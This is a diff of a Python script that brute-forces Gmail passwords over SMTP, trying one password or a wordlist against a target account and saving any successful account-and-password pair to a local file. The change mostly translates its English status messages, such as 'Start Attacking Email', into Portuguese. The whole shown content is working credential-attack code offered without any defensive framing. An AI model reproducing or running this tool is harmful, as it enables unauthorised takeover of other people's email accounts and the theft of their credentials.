@@ -100,25 +100,25 @@ elif options.gmail !=None or  options.gmail== None or options.gmail==None:
     smtp_srverG.ehlo()
     smtp_srverG.starttls()
     if options.password != None or options.list_password == None  :
-        print("%s<<<<<<+++++Comece a atacar e-mail+++++>>>>>%s"%(R,W))
+        print("%s<<<<<<+++++Comece a atacar o Gmail+++++>>>>>%s"%(R,W))
         try :    
             smtp_srverG.login(options.gmail,options.password)
-            print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
+            print("sua senha foi encontrada com sucesso :{} \t Gmail encontrado:{}".format(options.password,options.gmail))
             Save = io.open("gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+options.password+"\n")
         except :
-            print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
+            print("Senha não encontrada : {} \t Gmail:{}".format(options.password,options.gmail))
     elif options.list_password !=None:
         password_list = io.open(options.list_password,"r").readlines()
         for password in password_list:
             password = password.rstrip("\n")
-            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
+            print("%s<<<<<<+++++Comece a atacar o Gmail+++++>>>>>%s"%(R,W))
             try :    
                 smtp_srverG.login(options.gmail,password)
-                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
-                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+password+"\n")
+                print("{}<<<+++sua senha foi encontrada com sucesso  :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
+                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tsenha:"+password+"\n")
                 break
             except smtplib.SMTPAuthenticationError:
-                print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
+                print("{}<<<---Senha não encontrada : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
 
 else:
     print(use.usage)
